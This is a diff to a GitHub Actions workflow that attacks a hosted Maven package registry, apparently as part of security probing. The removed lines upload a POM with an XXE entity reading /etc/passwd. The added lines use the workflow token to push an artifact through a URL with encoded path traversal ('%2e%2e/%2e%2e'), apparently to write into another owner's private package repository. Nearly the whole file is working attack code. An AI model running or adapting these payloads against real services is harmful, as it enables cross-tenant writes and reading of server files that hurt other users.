@@ -1,4 +1,4 @@
-name: G10 Maven parser XXE differential
+name: G10 Maven path boundary differential
 on:
   push:
     paths:
@@ -10,27 +10,24 @@ jobs:
   publish:
     runs-on: ubuntu-latest
     steps:
-      - name: Upload Maven external entity canary
+      - name: Probe encoded Maven namespace traversal
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
           set -eux
           mkdir -p /tmp/g10m/empty
-          jar cf /tmp/g10m/g10-parser-30853164675.jar -C /tmp/g10m/empty .
-          cat > /tmp/g10m/pom.xml <<EOF
+          jar cf /tmp/g10m/g10-cross-write-20260803.jar -C /tmp/g10m/empty .
+          cat > /tmp/g10m/g10-cross-write-20260803.pom <<EOF
           <?xml version="1.0" encoding="UTF-8"?>
-          <!DOCTYPE project [
-            <!ENTITY g10 SYSTEM "file:///etc/passwd">
-          ]>
           <project xmlns="http://maven.apache.org/POM/4.0.0">
             <modelVersion>4.0.0</modelVersion>
             <groupId>com.apexblack.g10</groupId>
-            <artifactId>g10-parser-30853164675</artifactId>
-            <version>1.0.5</version>
+            <artifactId>g10-cross-write-20260803</artifactId>
+            <version>1.0.0</version>
             <packaging>jar</packaging>
-            <description>&g10;</description>
+            <description>PRIMARY-PATH-TRAVERSAL-CANARY</description>
           </project>
           EOF
-          base=https://maven.pkg.github.com/apexblack-koala-274804/chainship-test-release/com/apexblack/g10/g10-parser-30853164675/1.0.5
-          curl -fsS -u "$GITHUB_ACTOR:$GITHUB_TOKEN" --upload-file /tmp/g10m/g10-parser-30853164675.jar "$base/g10-parser-30853164675-1.0.5.jar"
-          curl -fsS -u "$GITHUB_ACTOR:$GITHUB_TOKEN" -H "Content-Type: application/xml" --upload-file /tmp/g10m/pom.xml "$base/g10-parser-30853164675-1.0.5.pom"
+          base=https://maven.pkg.github.com/apexblack-koala-274804/chainship-test-release/%2e%2e/%2e%2e/apexblack-kangaroo-1782761273/g10-cross-primary-private-30853164675/com/apexblack/g10/g10-cross-write-20260803/1.0.0
+          curl -fsS -u "$GITHUB_ACTOR:$GITHUB_TOKEN" --upload-file /tmp/g10m/g10-cross-write-20260803.jar "$base/g10-cross-write-20260803-1.0.0.jar"
+          curl -fsS -u "$GITHUB_ACTOR:$GITHUB_TOKEN" -H "Content-Type: application/xml" --upload-file /tmp/g10m/g10-cross-write-20260803.pom "$base/g10-cross-write-20260803-1.0.0.pom"
